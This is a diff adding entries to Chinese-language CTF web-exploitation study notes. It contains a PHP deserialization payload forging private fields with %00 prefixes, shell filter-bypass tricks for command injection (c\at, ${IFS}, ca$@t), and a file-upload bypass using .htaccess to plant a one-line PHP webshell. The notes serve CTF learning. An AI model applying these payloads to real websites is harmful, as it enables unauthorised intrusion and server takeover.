@@ -91,6 +91,28 @@ tostring函数可以在echo中被调用
 
 
 
+**如何构造private属性序列化**
+
+class Name
+
+​	private username
+
+于是我们这样构造pyload:
+
+?select=O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}
+
+然后我们又意识到，这个变量时private
+
+private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字
+
+段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度
+
+于是我们在构造一回pyload:
+
+?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
+
+
+
 ## PHP伪协议
 
 https://blog.csdn.net/weixin_51735061/article/details/123156046
@@ -170,6 +192,12 @@ ip=;cat$IFS$9`ls`
 
 
 
+- cat过滤   ==> c\at绕过  （可以在linux系统测试，是可以的）
+- 空格过滤 ==> ${IFS}绕过
+- flag过滤  ==> fl\ag
+
+
+
 ## XXF
 
 从本地页面跳转使用
@@ -218,6 +246,16 @@ $IFS$9可用来代替空格
 < 、<>、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等
 ```
 
+例题：
+
+```php
+    $get_flag = $_GET['get_flag'];
+    if(!strstr($get_flag," ")){
+        $get_flag = str_ireplace("cat", "wctf2020", $get_flag); 
+```
+
+ 此处cat可以用ca$@t 绕过 空格可以用$IFS绕过
+
 ### PUT 请求
 
 put请求需要利用burp抓包再修改
@@ -245,3 +283,18 @@ php3，php5，pht，phtml，phps都是php可运行的文件扩展名
 ```
 
 蚁剑连接方式：找到上传文件的路径 密码填hack即可
+
+
+
+ph绕过：
+
+先上传.htaccess配置文件 可以使服务器将jpg解析为php
+
+如果上传失败，则使用burp将Content-Type改为image/jpeg等
+
+再上传一句话木马即可
+
+#### 火狐禁用js
+
+可以在网上找到教程
+
